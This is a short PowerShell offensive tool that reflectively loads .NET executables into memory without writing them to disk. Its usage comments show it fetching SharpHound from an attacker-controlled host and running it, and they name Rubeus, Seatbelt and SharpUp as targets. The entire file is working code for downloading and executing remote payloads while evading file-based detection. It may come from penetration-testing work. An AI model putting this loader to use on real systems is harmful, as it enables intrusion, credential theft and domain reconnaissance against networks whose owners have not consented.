# Load-Assembly.ps1 - execute .NET assemblies from bytes in memory (execute-assembly equivalent)
# No file drop. Works for Seatbelt / SharpUp / Rubeus / SharpHound style EXEs with static Main.
# Usage:
#   . .\Load-Assembly.ps1
#   Invoke-AssemblyInMemory -Path .\tools\sharphound\SharpHound.exe -Args '--Domain','lab.local'
#   Invoke-AssemblyInMemory -Url 'http://<attack>:8000/SharpHound.exe' -Args '-c','All'
param()

function Invoke-AssemblyInMemory {
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName='file')][string]$Path,
        [Parameter(ParameterSetName='url')][string]$Url,
        [string[]]$Args = @()
    )
    if ($PSCmdlet.ParameterSetName -eq 'url') {
        $wc = New-Object Net.WebClient
        $bytes = $wc.DownloadData($Url)
    } else {
        $bytes = [IO.File]::ReadAllBytes((Resolve-Path $Path))
    }
    Write-Verbose ("[*] loaded {0} bytes" -f $bytes.Length)
    $asm = [Reflection.Assembly]::Load($bytes)
    $entry = $asm.EntryPoint
    if ($null -eq $entry) { throw "no entry point" }
    # entry point is (string[] args); instance methods need the type instance
    $ps = $entry.GetParameters()
    if ($entry.IsStatic) {
        $null = $entry.Invoke($null, @( ,$Args ))
    } else {
        $inst = [Activator]::CreateInstance($entry.DeclaringType)
        $null = $entry.Invoke($inst, @( ,$Args ))
    }
}
